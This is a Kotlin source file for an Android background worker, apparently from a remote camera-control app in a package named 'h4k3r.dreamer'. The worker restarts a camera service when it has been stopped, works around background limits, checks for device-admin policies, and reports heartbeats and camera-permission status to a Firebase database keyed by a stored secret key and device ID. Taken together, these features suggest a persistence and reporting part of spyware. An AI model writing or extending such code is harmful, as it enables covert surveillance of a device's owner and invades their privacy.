package com.h4k3r.dreamer

import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import android.os.Build

/**
 * WorkManager Worker for handling camera operations when the app is in background.
 * This ensures camera functionality continues even when foreground services are restricted.
 */
class CameraBackgroundWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "CameraBackgroundWorker"
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "CameraBackgroundWorker starting")

            // Check if CameraService is running
            if (!isCameraServiceRunning()) {
                Log.w(TAG, "CameraService not running, attempting to restart")

                // Try to start CameraService
                val intent = Intent(applicationContext, CameraService::class.java)
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        applicationContext.startForegroundService(intent)
                    } else {
                        applicationContext.startService(intent)
                    }
                    Log.d(TAG, "CameraService restart initiated")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to restart CameraService: ${e.message}")
                    // Continue with worker anyway
                }
            }

            // Check and handle device policy restrictions
            val isDevicePolicyBlocking = checkDevicePolicyRestrictions()
            if (isDevicePolicyBlocking) {
                Log.w(TAG, "Device policy is blocking camera - optimizing for background mode")

                // Update Firebase with device policy status
                updateDevicePolicyStatus()
            }

            // Perform background health check
            performBackgroundHealthCheck()

            Log.d(TAG, "CameraBackgroundWorker completed successfully")
            Result.success()

        } catch (e: Exception) {
            Log.e(TAG, "CameraBackgroundWorker failed: ${e.message}")
            Result.failure()
        }
    }

    private fun isServiceRunning(serviceName: String): Boolean {
        return try {
            val activityManager = applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
            runningServices.any { it.service.className == serviceName }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking service status: ${e.message}")
            false
        }
    }

    private fun isCameraServiceRunning(): Boolean {
        return isServiceRunning(CameraService::class.java.name)
    }

    private fun getSecretKey(): String? {
        val prefs = applicationContext.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
        return prefs.getString("secret_key", null)
    }

    private fun getDeviceId(): String? {
        val prefs = applicationContext.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
        return prefs.getString("device_id", null)
    }

    private fun checkFirebaseConnection() {
        try {
            val secretKey = getSecretKey()
            val deviceId = getDeviceId()

            if (secretKey.isNullOrEmpty() || deviceId.isNullOrEmpty()) {
                Log.w(TAG, "Firebase authentication data missing")
                return
            }

            // Update heartbeat to indicate background worker is active
            try {
                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .child("background_worker_time")
                    .setValue(System.currentTimeMillis())

                Log.d(TAG, "Firebase heartbeat updated from background worker")
            } catch (e: Exception) {
                Log.e(TAG, "Firebase update failed: ${e.message}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Firebase connection check failed: ${e.message}")
        }
    }

    private fun checkCameraPermissions() {
        try {
            val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.CAMERA
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED

            if (!hasCameraPermission) {
                Log.w(TAG, "Camera permission lost, may need to request again")

                // Update Firebase with permission status
                val secretKey = getSecretKey()
                val deviceId = getDeviceId()

                if (!secretKey.isNullOrEmpty() && !deviceId.isNullOrEmpty()) {
                    try {
                        Firebase.database.reference
                            .child("devices")
                            .child(secretKey)
                            .child(deviceId)
                            .child("permissions")
                            .child("camera")
                            .setValue(false)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to update camera permission status: ${e.message}")
                    }
                }
            } else {
                Log.d(TAG, "Camera permission still available")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Camera permission check failed: ${e.message}")
        }
    }

    private fun checkDevicePolicyRestrictions(): Boolean {
        return try {
            val devicePolicyManager = applicationContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponents = devicePolicyManager.activeAdmins

            val hasActiveAdmin = adminComponents?.isNotEmpty() == true
            Log.d(TAG, "Device policy check: hasActiveAdmin=$hasActiveAdmin")

            hasActiveAdmin
        } catch (e: Exception) {
            Log.e(TAG, "Error checking device policy: ${e.message}")
            false
        }
    }

    private suspend fun updateDevicePolicyStatus() {
        val secretKey = getSecretKey()
        val deviceId = getDeviceId()

        if (!secretKey.isNullOrEmpty() && !deviceId.isNullOrEmpty()) {
            try {
                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .child("device_policy_blocking")
                    .setValue(true)

                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .child("background_mode_active")
                    .setValue(true)

                Log.d(TAG, "Device policy status updated in Firebase")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to update device policy status: ${e.message}")
            }
        }
    }

    private suspend fun performBackgroundHealthCheck() {
        // Update heartbeat to indicate background worker is active
        try {
            val secretKey = getSecretKey()
            val deviceId = getDeviceId()

            if (!secretKey.isNullOrEmpty() && !deviceId.isNullOrEmpty()) {
                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .child("background_worker_time")
                    .setValue(System.currentTimeMillis())

                Log.d(TAG, "Firebase heartbeat updated from background worker")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Firebase update failed: ${e.message}")
        }

        // Check camera permissions
        checkCameraPermissions()
    }
}